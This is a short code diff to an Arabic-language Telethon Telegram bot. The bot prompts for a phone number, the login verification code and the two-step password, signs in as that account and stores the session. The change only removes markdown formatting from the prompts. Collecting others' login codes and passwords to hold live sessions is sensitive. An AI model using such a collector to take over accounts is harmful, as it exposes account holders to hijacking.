@@ -40,14 +40,14 @@ async def Add_NUMBER(event, api_id, api_hash, phone_number):
             
             async with bot.conversation(event.chat_id, timeout=300) as conv:
                 # verification code
-                verification_code_msg = await conv.send_message("__ارسل الكود الذي وصلك.. صع علامة ( - ) بين كل رقم:__")
+                verification_code_msg = await conv.send_message("ارسل الكود الذي وصلك.. صع علامة ( - ) بين كل رقم:")
                 response_verification_code = await conv.get_response()
                 verification_code = str(response_verification_code.message).replace('-', '')
                 
                 try:
                     login = await iqthon.sign_in(phone_number, code=int(verification_code))
                 except errors.SessionPasswordNeededError:
-                    password_msg = await conv.send_message("__الحساب محمي بكلمة السر, ارسل كلمة السر :__")
+                    password_msg = await conv.send_message("الحساب محمي بكلمة السر, ارسل كلمة السر :")
                     password = await conv.get_response()
                     
                     login = await iqthon.sign_in(phone_number, password=password.text)
@@ -68,7 +68,7 @@ async def StartButtons(event, role):
         buttons = [[Button.inline("اضف رقم", "add_number")]]
     elif role == 1:
         buttons = [[Button.inline("اضف رقم", "add_number")], [Button.inline("حذف رقم", "remove_number")]]
-    await event.reply("__لاضافة رقم اضغط على الزر اسفله لبدأ عملية اضافة الرقم__", buttons=buttons)
+    await event.reply("لاضافة رقم اضغط على الزر اسفله لبدأ عملية اضافة الرقم", buttons=buttons)
 
 
 # BOT START
@@ -98,7 +98,7 @@ async def Callbacks_(event):
     try:
         async with bot.conversation(event.chat_id, timeout=200) as conv:
             # verification code
-            get_number= await conv.send_message("__ارسل الرقم لحذفه__")
+            get_number= await conv.send_message("*ارسل الرقم لحذفه*")
             remove_number = await conv.get_response()
             remove_number = (remove_number.text).replace('+', '').replace(' ', '')
             for session in sessions:
